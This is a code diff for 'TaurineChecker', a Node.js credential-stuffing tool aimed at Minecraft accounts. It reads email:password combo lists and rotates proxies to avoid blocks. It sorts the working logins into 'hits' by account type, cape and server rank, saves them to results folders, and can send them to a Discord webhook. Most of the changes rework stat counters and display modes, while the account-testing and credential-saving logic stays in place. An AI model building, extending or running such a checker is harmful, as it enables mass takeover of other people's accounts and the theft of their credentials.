@@ -20,43 +20,88 @@ module.exports.def = {
         "Content-Type": "application/json",
         'Pragma': 'no-cache'
     },
-    stats: {
-        badMojang: 0,
-        badOF: 0,
-        badMinecon: 0,
-        badFC: 0,
-        badMFA: 0,
-        hitMojang: 0,
-        hitOF: 0,
-        hitMinecon: 0,
-        hitFC: 0,
-        hitMFA: 0,
-        hitSFA: 0,
-        hitNFA: 0,
-        hitHypixel: 0,
-        hitLabyMod: 0
+    hit: {
+        optifine: 0,
+        funcraft: 0,
+        nfa: 0,
+        fa: 0,
+        mfa: 0,
+        labymod: 0,
+        minecon: 0,
+        hypixel: 0,
+    },
+    bad: {
+        optifine: 0,
+        funcraft: 0,
+        mc: 0,
+        mfa: 0,
+        labymod: 0,
+        minecon: 0,
+        hypixel: 0,
     }
 }
 
+let line = 7
+const process = require("process")
+const rdl = require("readline")
+class LoadingBar {
+    constructor(size) {
+        this.size = size
+        this.cursor = 0
+        this.timer = null
+    }
+    start() {
+        process.stdout.write("\x1B[?25l")
+        process.stdout.write("[")
+        for (let i = 0; i < this.size; i++) {
+            process.stdout.write("-")
+        }
+        process.stdout.write("]")
+        this.cursor = 1
+        rdl.cursorTo(process.stdout, this.cursor, line);
+        this.timer = setInterval(() => {
+            process.stdout.write("=")
+            this.cursor++;
+            if (this.cursor >= this.size) {
+                clearTimeout(this.timer)
+                process.stdout.write("\x1B[?25h")
+            }
+        }, 100)
+    }
+}
+const ld = new LoadingBar(50)
 clear();
 
-let showFiglet = async () => {
-    console.log(chalk.red(figlet.textSync(`TaurineChecker`)) + "v" + this.def.version + " by D0wzy (https://github.com/D0wzy)");
+let showFiglet = async (o) => {
+    console.log(`${chalk.red(figlet.textSync(`TaurineChecker`))} v${this.def.version} by D0wzy (https://github.com/D0wzy)${o ? `\nMode: ${o.mode}`: ``}`);
 }
 
 let showStats = async () => {
-    setTimeout(async () => {
-        logUpdate(`${chalk.underline('» Stats:')}
-・MFA: ${chalk.green(this.def.stats.hitMFA)}
-・NFA: ${chalk.green(this.def.stats.hitNFA)}
-・SFA: ${chalk.green(this.def.stats.hitSFA)}
-・Cape OptiFine: ${chalk.green(this.def.stats.hitMojang)}
-・LabyMod Cape: ${chalk.green(this.def.stats.hitLabyMod)}
-・Ranked FunCraft: ${chalk.green(this.def.stats.hitFC)}
-・Ranked Hypixel: ${chalk.green(this.def.stats.hitHypixel)}
-・Cape Minecon: ${chalk.green(this.def.stats.hitMinecon)}`);
-    }, 100)
-    //process.stdout.write(`${chalk.underline('» Stats:')}\n・MFA: ${this.def.stats.hitMFA}\n・FA: ${this.def.stats.hitMojang}\n・OptiFine: ${this.def.stats.hitMojang}\n・FunCraft: ${this.def.stats.hitFC}\n・Minecon: ${this.def.stats.hitMinecon}`);
+    if (this.def.statsmode) {
+        let start = async () => {
+            if (!this.def.stopped) {
+                var timeout = setTimeout(async () => {
+                    logUpdate(`\n${chalk.underline('» Stats:')}
+・MFA: ${chalk.green(this.def.hit.mfa)}
+・NFA: ${chalk.green(this.def.hit.nfa)}
+・SFA: ${chalk.green(this.def.hit.fa)}
+・Cape OptiFine: ${chalk.green(this.def.hit.optifine)}
+・Cape Minecon: ${chalk.green(this.def.hit.minecon)}
+・LabyMod Cape: ${chalk.green(this.def.hit.labymod)}
+・Ranked FunCraft: ${chalk.green(this.def.hit.funcraft)}
+・Ranked Hypixel: ${chalk.green(this.def.hit.hypixel)}
+    
+・Total Hit: ${chalk.green(this.def.hit.nfa + this.def.hit.fa + this.def.hit.mfa)}
+・Total Bad: ${chalk.red(this.def.bad.mc)}`);
+                    start()
+                }, 100)
+            }
+        }
+        this.def.stopStat = async () => {
+            clearTimeout(timeout)
+        }
+        return start()
+    }
 }
 
 
@@ -64,7 +109,7 @@ showFiglet()
 
 const timeout = async () => {
     setTimeout(async () => {
-        process.title = `💉・TaurineChecker | Hit: ${this.def.stats.hitMojang} | Bad: ${this.def.stats.badMojang} | Optifine Caped: ${this.def.stats.hitOF} | Minecon Caped: ${this.def.stats.hitMinecon} | CPM: 0 | Checked: 0%`
+        process.title = `💉・TaurineChecker | Hit: ${this.def.hit.nfa + this.def.hit.fa + this.def.hit.mfa} | Bad: ${this.def.bad.mc} | Optifine Caped: ${this.def.hit.optifine} | Minecon Caped: ${this.def.hit.minecon} | CPM: 0 | Checked: 0%`
         timeout()
 
         //process.stdout.clearLine();
@@ -93,11 +138,49 @@ if (!fs.existsSync("./config.json")) {
             config = JSON.parse(fs.readFileSync("./config.json"))
 
             if (config.UseWebHook && config.WebHook !== "") this.def.webhookClient = new Discord.WebhookClient(config.WebHook.split("/")[5], config.WebHook.split("/")[6])
+
+            if (!fs.existsSync('./results/optifine') && config.Options.CheckOptifine) {
+                fs.mkdirSync('./results/optifine');
+            }
+            
+            if (!fs.existsSync('./results/minecon') && config.Options.CheckMinecon) {
+                fs.mkdirSync('./results/minecon');
+            }
+            
+            if (!fs.existsSync('./results/funcraft') && config.Options.CheckFunCraft) {
+                fs.mkdirSync('./results/funcraft');
+            }
+            
+            if (!fs.existsSync('./results/hypixel') && config.Options.CheckHypixel) {
+                fs.mkdirSync('./results/hypixel');
+            }
+            if (!fs.existsSync('./results/mfa') && config.Options.CheckMFA) {
+                fs.mkdirSync('./results/mfa');
+            }
         })
     })
 } else {
     config = JSON.parse(fs.readFileSync("./config.json"))
     if (config.UseWebHook && config.WebHook !== "") this.def.webhookClient = new Discord.WebhookClient(config.WebHook.split("/")[5], config.WebHook.split("/")[6])
+
+    if (!fs.existsSync('./results/optifine') && config.Options.CheckOptifine) {
+        fs.mkdirSync('./results/optifine');
+    }
+    
+    if (!fs.existsSync('./results/minecon') && config.Options.CheckMinecon) {
+        fs.mkdirSync('./results/minecon');
+    }
+    
+    if (!fs.existsSync('./results/funcraft') && config.Options.CheckFunCraft) {
+        fs.mkdirSync('./results/funcraft');
+    }
+    
+    if (!fs.existsSync('./results/hypixel') && config.Options.CheckHypixel) {
+        fs.mkdirSync('./results/hypixel');
+    }
+    if (!fs.existsSync('./results/mfa') && config.Options.CheckMFA) {
+        fs.mkdirSync('./results/mfa');
+    }
 }
 
 handler.checkUpdate().then(async (v) => {
@@ -108,12 +191,27 @@ handler.checkUpdate().then(async (v) => {
 
 let userProxies = []
 let proxies = []
+let psize = 0
+let asize = 0
 
 const initCheck = async () => {
     fs.readFile(`./combo.txt`, async (err, data) => {
         data = data.toString();
         const acc = data.split("\r\n")
         let i = 0;
+        asize = acc.length
+
+        if (config.UseProxy) {
+            fs.readFile(`./proxies.txt`, async (err, data) => {
+                data = data.toString();
+                const lines = data.split("\r\n");
+
+                psize = lines.length
+            })
+        }
+
+        if (this.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("INFO")}] Now cheking ${asize} accounts${config.UseProxy ? ` using ${psize} prox${psize > 1 ? 'ies' : 'y'}` : `.`}\n`)
+
 
         acc.forEach(async (a) => {
             let mail = a.split(":")[0]
@@ -125,6 +223,8 @@ const initCheck = async () => {
                     fs.readFile(`./proxies.txt`, async (err, data) => {
                         data = data.toString();
                         const lines = data.split("\r\n");
+
+                        psize = lines.length
 
                         if (!lines[i]) i = 0
                         //console.log("cc")
@@ -151,6 +251,7 @@ const initCheck = async () => {
                                 handler.throwHitMojang({
                                     mail: mail,
                                     password: pw,
+                                    type: res.type,
                                     username: res.username,
                                     proxy: {
                                         ip: lines[i].split(":")[0],
@@ -213,20 +314,24 @@ const initCheck = async () => {
 
                                 if (config.Options.CheckFunCraft) {
                                     handler.checkFuncraft(res).then(async (s) => {
-                                        if (s.neverConnected) handler.throwBadFC({
+                                        if (s.neverConnected) return handler.throwBadFC({
                                             username: res.username,
+                                            mail: mail,
+                                            password: res.password,
                                             neverConnected: true
                                         })
-                                        if (s.rank == "Joueur") {
+                                        if (s.rank === "Joueur") {
                                             handler.throwBadFC({
-                                                rank: s.rank,
-                                                username: res.username,
-                                                password: res.password
+                                            username: res.username,
+                                            mail: mail,
+                                            password: res.password,
+                                            neverConnected: true
                                             })
                                         } else {
                                             handler.throwHitFC({
                                                 rank: s.rank,
                                                 username: res.username,
+                                                mail: mail,
                                                 password: res.password
                                             })
                                         }
@@ -249,9 +354,10 @@ const initCheck = async () => {
                                 password: pw
                             })
                         } else {
-                            handler.throwHit({
+                            handler.throwHitMojang({
                                 mail: mail,
                                 password: pw,
+                                type: res.type,
                                 username: res.username
                             })
 
@@ -286,20 +392,24 @@ const initCheck = async () => {
 
                             if (config.Options.CheckFunCraft) {
                                 handler.checkFuncraft(res).then(async (s) => {
-                                    if (s.neverConnected) handler.throwBadFC({
+                                    if (s.neverConnected) return handler.throwBadFC({
                                         username: res.username,
+                                        mail: mail,
+                                        password: res.password,
                                         neverConnected: true
                                     })
                                     if (s.rank == "Joueur") {
                                         handler.throwBadFC({
                                             rank: s.rank,
                                             username: res.username,
+                                            mail: mail,
                                             password: res.password
                                         })
                                     } else {
                                         handler.throwHitFC({
                                             rank: s.rank,
                                             username: res.username,
+                                            mail: mail,
                                             password: res.password
                                         })
                                     }
@@ -325,9 +435,17 @@ const readline = require('readline');
 readline.emitKeypressEvents(process.stdin);
 process.stdin.setRawMode(true);
 process.stdin.on('keypress', (str, key) => {
+    //console.log(key)
     if (key.ctrl && key.name === 'c') {
         process.exit();
     } else if (key.name === '1' && !this.def.started) {
+        clear()
+        showFiglet()
+        process.stdout.write("Loading...")
+        process.stdout.cursorTo(0, line);
+        ld.start()
+
+        wait(5500)
         initCheck()
         this.def.started = true
         this.def.overviewmode = true
@@ -335,6 +453,13 @@ process.stdin.on('keypress', (str, key) => {
         clear();
         showFiglet()
     } else if (key.name === '2' && !this.def.started) {
+        clear()
+        showFiglet()
+        process.stdout.write("Loading...")
+        process.stdout.cursorTo(0, line);
+        ld.start()
+
+        wait(5500)
         initCheck()
         this.def.started = true
         this.def.statsmode = true
@@ -342,7 +467,36 @@ process.stdin.on('keypress', (str, key) => {
         clear();
         showFiglet()
         showStats()
+    } else if (key.sequence === "\r" && key.name === "return" && this.def.started) {
+        clear()
+
+        if (this.def.overviewmode && !this.def.statsmode) {
+            this.def.overviewmode = false
+            this.def.statsmode = true
+            this.def.stopped = false
+            logUpdate.clear()
+            clear();
+            showFiglet({
+                mode: "Stats"
+            })
+            showStats()
+        } else {
+            clear();
+            this.def.overviewmode = true
+            this.def.statsmode = false
+
+            this.def.stopStat()
+            this.def.stopped = true
+
+            showFiglet({
+                mode: "Overview"
+            })
+        }
     }
 });
 
-process.stdout.write(`${chalk.underline('» Select your mode:')}\n\r[${chalk.red("1")}]・Overview Mode\n\r[${chalk.red("2")}]・Stats Mode`);
+process.stdout.write(`${chalk.underline('» Select your mode:')}
+[${chalk.red("1")}]・Overview Mode
+[${chalk.red("2")}]・Stats Mode
+
+To switch mode, press ${chalk.bold("CTRL + M")}`);
